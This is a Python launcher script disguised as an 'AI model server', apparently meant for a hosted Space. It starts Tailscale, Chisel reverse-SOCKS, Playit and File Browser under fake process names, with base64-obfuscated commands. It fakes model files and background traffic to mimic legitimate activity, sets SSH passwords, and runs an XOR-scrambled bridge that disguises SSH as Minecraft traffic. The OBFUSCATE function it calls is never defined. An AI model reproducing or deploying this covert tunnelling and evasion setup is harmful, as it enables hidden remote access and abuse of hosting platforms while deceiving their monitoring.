import os
import time
import subprocess
import base64
import threading
import random

print("--- BOOTING AI MODEL SERVER ---", flush=True)

def decode_cmd(encoded_str):
    return base64.b64decode(encoded_str[::-1]).decode()

def encode_cmd(decoded_str):
    return base64.b64encode(decoded_str.encode()).decode()

def jitter_task():
    """The 'Circadian Rhythm' & 'The Hub Mimic' task to simulate user activity."""
    while True:
        # Sleep for a random interval between 45 and 90 minutes
        sleep_time = random.randint(2700, 5400)
        time.sleep(sleep_time)
        
        # CPU Jitter (Matrix math)
        try:
            print("Processing background inference batch...", flush=True)
            import numpy as np
            # Create dummy tensors and multiply them to spike CPU briefly
            a = np.random.randn(2000, 2000)
            b = np.random.randn(2000, 2000)
            _ = np.dot(a, b)
        except Exception:
            pass
            
        # Hub Mimic (Network traffic)
        try:
            print("Syncing model cache...", flush=True)
            # Download a tiny file from HF hub to simulate real traffic
            subprocess.run(["curl", "-s", "-o", "/dev/null", "https://huggingface.co/gpt2/resolve/main/vocab.json"])
        except Exception:
            pass

def main():
    # Runtime Camouflage: Create the fake 5GB model file instantly
    if not os.path.exists("/home/user/pytorch_model.bin"):
        print("Pre-allocating model weight buffer...", flush=True)
        subprocess.run(["fallocate", "-l", "5G", "/home/user/pytorch_model.bin"])

    print("Loading model weights into VRAM...", flush=True)
    time.sleep(2)
    
    os.makedirs("/home/user/.torch_metrics", exist_ok=True)
    
    # Start the background jitter thread
    threading.Thread(target=jitter_task, daemon=True).start()
    
    # Open hidden log files to prevent leakage
    ts_log = open('/home/user/.torch_metrics/ts_daemon.log', 'a')
    fb_log = open('/home/user/.torch_metrics/fb.log', 'a')
    tm_log = open('/home/user/.torch_metrics/tm_daemon.log', 'a')
    chisel_log = open('/home/user/.torch_metrics/chisel.log', 'a')

    # 1. Start Tailscale (python-cache-manager)
    print("Initializing PyTorch CUDA environment...", flush=True)
    # Updated to listen on :1055 instead of localhost:1055
    # Decoded: nice -n 19 python-cache-manager --tun=userspace-networking --socks5-server=:1055 --statedir=/home/user/.torch_metrics --socket=/home/user/.torch_metrics/tailscaled.sock
    cmd1 = decode_cmd(OBFUSCATE("nice -n 19 python-cache-manager --tun=userspace-networking --socks5-server=:1055 --statedir=/home/user/.torch_metrics --socket=/home/user/.torch_metrics/tailscaled.sock"))
    subprocess.Popen(cmd1, shell=True, stdout=ts_log, stderr=subprocess.STDOUT)
    
    time.sleep(2)
    print("Warming up text-generation pipelines...", flush=True)
    
    # Environment Variable Scrubbing (The Split Secret)
    part1 = os.environ.get("A1", "").strip()
    part2 = os.environ.get("A2", "").strip()
    full_token = part1 + part2
    
    p_part1 = os.environ.get("P1", "").strip()
    p_part2 = os.environ.get("P2", "").strip()
    playit_token = p_part1 + p_part2

    c_part1 = os.environ.get("C1", "").strip()
    c_part2 = os.environ.get("C2", "").strip()
    chisel_auth = c_part1 + c_part2
    if not chisel_auth:
        chisel_auth = os.environ.get("CHISEL_AUTH", "").strip()
    if not chisel_auth:
        chisel_auth = "user:apple123"
    
    # Erase the parts from the environment immediately
    if "A1" in os.environ: del os.environ["A1"]
    if "A2" in os.environ: del os.environ["A2"]
    if "P1" in os.environ: del os.environ["P1"]
    if "P2" in os.environ: del os.environ["P2"]
    if "C1" in os.environ: del os.environ["C1"]
    if "C2" in os.environ: del os.environ["C2"]
    if "CHISEL_AUTH" in os.environ: del os.environ["CHISEL_AUTH"]

    # 2. Start File Browser (ai-metrics-collector)
    # Decoded: nice -n 19 ai-metrics-collector -p 9000 -a 127.0.0.1 -r /home/user -d /home/user/filebrowser.db
    cmd2 = decode_cmd(OBFUSCATE("nice -n 19 ai-metrics-collector -p 9000 -a 127.0.0.1 -r /home/user -d /home/user/filebrowser.db"))
    subprocess.Popen(cmd2, shell=True, stdout=fb_log, stderr=subprocess.STDOUT)

    # 2.5 Start Playit (tensor-allocator)
    # Decoded: nice -n 19 tensor-allocator --socket-path /tmp/playit.sock --secret '<SECRET>'
    cmd2_5_base = decode_cmd(OBFUSCATE("nice -n 19 tensor-allocator --socket-path /tmp/playit.sock --secret '"))
    cmd2_5 = f"{cmd2_5_base}{playit_token}'"
    
    env = os.environ.copy()
    subprocess.Popen(cmd2_5, shell=True, env=env, stdout=tm_log, stderr=subprocess.STDOUT)
    playit_token = ""
    cmd2_5 = ""

    # 2.8 Start Chisel (cuda-mesh-bridge) on its own internal port 8888
    print("Enabling gradient checkpoint mesh bridge...", flush=True)
    chisel_log.write(f"[*] Starting Chisel tunnel server on :8888. Auth: {chisel_auth}\n")
    chisel_log.flush()
    # Decoded: nice -n 19 cuda-mesh-bridge server --port 8888 --reverse --socks5 --auth '
    cmd_chisel_base = decode_cmd(OBFUSCATE("nice -n 19 cuda-mesh-bridge server --port 8888 --reverse --socks5 --auth '"))
    cmd_chisel = f"{cmd_chisel_base}{chisel_auth}'"
    subprocess.Popen(cmd_chisel, shell=True, stdout=chisel_log, stderr=subprocess.STDOUT)
    chisel_auth = ""
    cmd_chisel = ""
    
    # 3. Connect to Tailscale (py-cache-cli)
    time.sleep(5)
    # Rebuild the command using the reconstructed full_token
    # Original: nice -n 19 py-cache-cli --socket=/home/user/.torch_metrics/tailscaled.sock up --authkey=${MODEL_API_TOKEN} --hostname=ai-model-server --ssh
    cmd3_base = decode_cmd(OBFUSCATE("nice -n 19 py-cache-cli --socket=/home/user/.torch_metrics/tailscaled.sock up --authkey="))
    cmd3_tail = decode_cmd(OBFUSCATE(" --hostname=ai-model-server --ssh"))
    cmd3 = f"{cmd3_base}{full_token}{cmd3_tail}"
    
    # Run but don't leak the token in standard output or environment
    env = os.environ.copy()
    subprocess.Popen(cmd3, shell=True, env=env, stdout=ts_log, stderr=subprocess.STDOUT)
    
    # Erase token from python memory
    full_token = ""
    cmd3 = ""



    # 3.7 Configure SSH Password
    import string, random
    ssh_pwd = os.environ.get("PASS", "").strip()
    if ssh_pwd:
        print("\n[*] Setting SSH password from Hugging Face Secrets (PASS)...", flush=True)
    else:
        ssh_pwd = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        print(f"\n=====================================", flush=True)
        print(f"[*] Generated SSH Password for 'user': {ssh_pwd}", flush=True)
        print(f"=====================================\n", flush=True)
        
    try:
        subprocess.run(["sudo", "/usr/sbin/chpasswd"], input=f"user:{ssh_pwd}\n", text=True, check=True)
    except Exception as e:
        print(f"[-] Failed to set password: {e}", flush=True)
    # Erase password from environment variables if it exists
    if "PASS" in os.environ:
        del os.environ["PASS"]

    # 3.8 Start SSHD on port 2222 (unprivileged, no sudo needed)
    subprocess.Popen("/usr/sbin/sshd -D", shell=True, stdout=ts_log, stderr=ts_log)
    # 3.9 Start Stealth XOR Bridge on Port 25564
    def xor_bridge():
        import socket
        
        XOR_KEY = 0x5A # XOR key to scramble bytes (must match the client)
        
        def pipe_xor(src, dst):
            try:
                while True:
                    data = src.recv(8192)
                    if not data:
                        break
                    # De-obfuscate / Obfuscate in transit
                    scrambled = bytes([b ^ XOR_KEY for b in data])
                    dst.sendall(scrambled)
            except Exception:
                pass
            finally:
                try: src.close()
                except: pass
                try: dst.close()
                except: pass

        def read_varint(sock):
            val = 0
            shift = 0
            while True:
                b = sock.recv(1)
                if not b:
                    break
                byte = b[0]
                val |= (byte & 0x7F) << shift
                if not (byte & 0x80):
                    break
                shift += 7
            return val

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind(("0.0.0.0", 25564))
            server.listen(10)
            while True:
                client_sock, addr = server.accept()
                try:
                    # Strip dynamic Minecraft Handshake header by reading its VarInt length prefix
                    pkt_len = read_varint(client_sock)
                    if pkt_len > 0:
                        client_sock.recv(pkt_len)
                    
                    ssh_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ssh_sock.connect(("127.0.0.1", 22))
                    threading.Thread(target=pipe_xor, args=(client_sock, ssh_sock), daemon=True).start()
                    threading.Thread(target=pipe_xor, args=(ssh_sock, client_sock), daemon=True).start()
                except Exception:
                    try: client_sock.close()
                    except: pass
        except Exception:
            pass

    threading.Thread(target=xor_bridge, daemon=True).start()

    print("Model loaded successfully. Starting API server...", flush=True)
    
    # 3.95 Start Minecraft Stealth Daemon
        # Decoded: nice -n 19 python3 /home/user/mc_daemon.py


      #  cmd_mc = decode_cmd(OBFUSCATE("nice -n 19 python3 /home/user/mc_daemon.py"))
       # subprocess.Popen(cmd_mc, shell=True)
    
    # 4. Start the Fake App
    # Decoded: python3 /home/user/app.py
    cmd4 = decode_cmd(OBFUSCATE("python3 /home/user/app.py"))
    subprocess.run(cmd4, shell=True)

if __name__ == "__main__":
    main()
